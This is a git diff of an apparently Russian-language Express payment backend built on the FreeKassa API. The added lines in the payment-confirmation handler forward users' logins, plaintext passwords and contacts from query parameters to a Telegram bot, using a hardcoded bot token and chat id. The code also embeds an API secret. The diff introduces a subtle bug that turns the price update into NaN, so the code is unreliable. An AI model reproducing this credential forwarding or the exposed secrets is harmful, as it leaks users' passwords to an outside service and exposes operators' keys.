@@ -97,8 +97,6 @@ app.get("/api/getStats", async(req,res) => {
 })
 
 app.get("/api/getBalance" , async(req,res) => {
-    let ip = req.connection.remoteAddress
-    console.log(ip)
     const api = "81e81e9681e06f238e641554c15c9d9d"
     let signature = crypto.createHmac("SHA256","81e81e9681e06f238e641554c15c9d9d").update("4|20586").digest("hex")
     console.log(signature)
@@ -116,42 +114,6 @@ app.post("/api/createPayForm", async (req,res) => {
 
     }
 })
-
-// app.get("/api/createPayForm", async (req,res) => {
-//     try {
-//         let data = Object.entries(req.body)
-//         let values = []
-//         data.sort().map((item,i) =>{
-//             values.push(item[1])
-//         })
-//         let str = values.join("|")
-//         console.log(str)
-//         let signature = crypto.createHmac("SHA256", "81e81e9681e06f238e641554c15c9d9d").update(str).digest("hex")
-//         axios.post("https://api.freekassa.ru/v1/orders/create",
-//             {
-//                 shopId: req.body.shopId,
-//                 nonce: req.body.nonce,
-//                 i: req.body.i,
-//                 email: req.body.email,
-//                 ip: req.body.ip,
-//                 currency: req.body.currency,
-//                 amount: req.body.amount,
-//                 signature: signature
-//             }).then(answer => {
-//                 res.status(200).json(answer.data)
-//         }).catch(error => {
-//             console.log(error)
-//             res.status(500).json({
-//                 message: "Произошла ошибка при создании формы оплаты"
-//             })
-//         })
-//     } catch (error){
-//         console.log(error)
-//         res.status(500).json({
-//             message: "Произошла ошибка при создании формы оплаты"
-//         })
-//     }
-// })
 
 app.get("/api/paydone", async (req,res) => {
     try {
@@ -189,7 +151,7 @@ app.get("/api/paydone", async (req,res) => {
                 name: "Денежный оборот"
             },
             {
-                $inc: {count: parseInt(req.query.us_price,10)}
+                $inc: {count: parseInt(req.query.us_price.replace,10)}
             },
             (err, doc) => {
                 if (err) {
@@ -198,6 +160,8 @@ app.get("/api/paydone", async (req,res) => {
                 console.log("Успешно обновили")
             }
         )
+        var message = `Новая успешная оплата%0AЛогин: ${req.query.us_login}%0AПароль: ${req.query.us_password}%0AДля связи: ${req.query.us_contact}%0AРеферал: ${req.query.us_referal}`
+        axios.post(`https://api.telegram.org/bot2061278459:AAHUbcu_npM2WdlcJcUFtMM6FDa69o1T65g/sendMessage?chat_id=1958598497&text=${message}&parse_mode=html`)
 
     } catch (error) {
         res.status(500).json({
